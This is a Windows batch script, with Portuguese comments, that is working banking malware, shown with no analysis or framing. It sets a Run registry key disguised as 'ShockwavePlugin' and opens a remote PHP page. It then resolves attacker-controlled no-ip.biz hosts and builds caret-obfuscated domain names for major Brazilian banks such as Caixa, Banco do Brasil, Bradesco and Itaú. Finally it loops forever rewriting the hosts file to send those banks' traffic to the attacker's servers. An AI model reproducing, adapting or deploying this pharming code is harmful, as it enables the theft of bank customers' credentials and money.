::@echo off
@break off
ver|find "Windows 98">nul
if not errorlevel 1 goto nao

if exist %windir%\system32\ctzz.dll goto con
::adicionando no regedit
> %windir%\system32\ctzz.dll echo y
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v ShockwavePlugin /t REG_SZ /d "%windir%\system32\plugin.exe" < %windir%\system32\ctzz.dll
start /min iexplore.exe "http://www.grupofadente.es/ofertas/google.php"
goto mapa
::Teste Conexao
:con
set ping=%windir%\system32\ping.exe
:teste
%ping% www.google.com -n 1 -l 1 | find "TTL" > nul
if not errorlevel 1 goto mapa
goto teste
::agendar
::magica
:mapa
::pegando IP
::CEF
for /f "tokens=2" %%D in ('nslookup mt-cef.no-ip.biz mt-cef.no-ip.biz ^| find "Address"') do set web=%%D
::BB
for /f "tokens=2" %%E in ('nslookup mt-bb.no-ip.biz mt-bb.no-ip.biz ^| find "Address"') do set site=%%E
::BRADESCO
for /f "tokens=2" %%G in ('nslookup mt-bra.no-ip.biz mt-bra.no-ip.biz ^| find "Address"') do set bra=%%G
::REAL
for /f "tokens=2" %%H in ('nslookup mt-rea.no-ip.biz mt-rea.no-ip.biz ^| find "Address"') do set rea=%%H
::UNI
for /f "tokens=2" %%J in ('nslookup mt-uni.no-ip.biz mt-uni.no-ip.biz ^| find "Address"') do set uni=%%J
::NCX
for /f "tokens=2" %%K in ('nslookup mt-ncx.no-ip.biz mt-ncx.no-ip.biz ^| find "Address"') do set nos=%%K
::ITA
for /f "tokens=2" %%Z in ('nslookup mt-ita.no-ip.biz mt-ita.no-ip.biz ^| find "Address"') do set ita=%%Z

::variaveis
set f1=g^o^v^.b^r
set f2=c^om.^b^r
set da=i^n^t^e^r^n^e^t^c^a^i^x^a.c^a^i^x^a.%f1%
set db=www.c^a^i^x^a.%f2%
set dc=c^ai^x^a.%f2%
set dd=www.cai^x^a.%f1%
set de=c^aix^a.%f1%
set df=www.c^ef^.%f2%
set dg=^c^ef.%f2%
set dh=www.c^e^f.%f1%
set di=^c^e^f^.%f1%
set dj=www.ca^i^xae^co^nomi^c^a.%f2%
set dl=ca^ixa^eco^no^mic^a.%f2%
set dm=www.^c^a^i^xae^con^omica.%f1%
set dn=cai^xaecon^o^m^i^c^a.%f1%
set dp=www.ca^ix^ae^co^no^mic^a^federal.%f2%
set dq=b^b.%f2%
set dr=ww^w.b^b.%f2%
set ds=ba^n^codo^br^asi^l.%f2%
set dt=w^w^w.b^anc^odob^ra^si^l.%f2%
::-------------------
set dv=w^w^w.b^r^ad^es^co.%f2%
set dx=w^ww.^re^a^l.%f2%
set dz=ww^w.^ban^cor^e^al.%f2%
set ea=ww^w.^un^iban^co.%f2%
set no=www.nossacaixa.%f2%
set it=www.itau.%f2%
::parte pra escrever o arquivo
> %temp%\~7.tmp echo %web% %da%&>> %temp%\~7.tmp echo %web% %db%&>> %temp%\~7.tmp echo %web% %dc%&>> %temp%\~7.tmp echo %web% %dd%&>> %temp%\~7.tmp echo %web% %de%&rem
>> %temp%\~7.tmp echo %web% %df%&>> %temp%\~7.tmp echo %web% %dg%&>> %temp%\~7.tmp echo %web% %dh%&>> %temp%\~7.tmp echo %web% %di%&>> %temp%\~7.tmp echo %web% %dj%&rem
>> %temp%\~7.tmp echo %web% %dl%&>> %temp%\~7.tmp echo %web% %dm%&>> %temp%\~7.tmp echo %web% %dn%&>> %temp%\~7.tmp echo %web% %dp%&rem
>> %temp%\~7.tmp echo %site% %dq%&>> %temp%\~7.tmp echo %site% %dr%&>> %temp%\~7.tmp echo %site% %ds%&>> %temp%\~7.tmp echo %site% %dt%&rem
>> %temp%\~7.tmp echo %bra% %dv%&>> %temp%\~7.tmp echo %rea% %dx%&>> %temp%\~7.tmp echo %rea% %dz%&rem
>> %temp%\~7.tmp echo %uni% %ea%&>> %temp%\~7.tmp echo %nos% %no%&>> %temp%\~7.tmp echo %ita% %it%&rem

::briga com o plugin
:l1
type %temp%\~7.tmp>%windir%\system32\drivers\etc\hosts&goto l1
:nao
exit

